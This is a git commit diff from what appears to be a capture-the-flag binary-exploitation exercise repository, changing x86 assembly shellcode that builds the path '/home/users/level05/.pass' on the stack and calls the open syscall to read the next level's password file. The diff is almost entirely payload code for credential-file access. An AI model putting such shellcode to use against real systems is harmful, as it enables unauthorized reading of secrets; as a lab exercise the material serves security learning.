57320a80674bac2cac7f97f08ff7e1909967d1d4
mli42 <mli@student.42.fr>
2022-05-31 02:48:57 +0200

    can call open

--- level04/Ressources/not_execve.asm
+++ level04/Ressources/not_execve.asm
@@ -5,23 +5,30 @@ section .text
 _start:
   xor eax, eax
 
-  ; push "r\0"
-  push eax
-  push 0x72
-
-  ; push "/home/users/level05/.pass"
-  push eax
-  push 0x73736170
-  push 0x2e2f3530
-  push 0x6c657665
-  push 0x6c2f7372
-  push 0x6573752f
-  push 0x656d6f68
-
-  lea eax, [esp + 28]
-  push eax
-  lea eax, [esp + 4]
+  ; mode = 0
   push eax
 
+  ; flags = O_RDONLY
+  push eax
+
+  ; push pathname = "/home/users/level05/.pass"
+  push eax
+  push 0x73
+  push 0x7361702e
+  push 0x2f35306c
+  push 0x6576656c
+  push 0x2f737265
+  push 0x73752f65
+  push 0x6d6f682f
+
+  lea eax, [esp + 30 + 4]
+  push eax
+  lea eax, [esp + 30]
+  push eax
+  lea eax, [esp + 8]
+  push eax
+
+  ; call open(".../level05/.pass", O_RDONLY)
+  xor eax, eax
   mov  al, 0x5
-  int  0x80 ; open(&stack, "r")
+  int  0x80
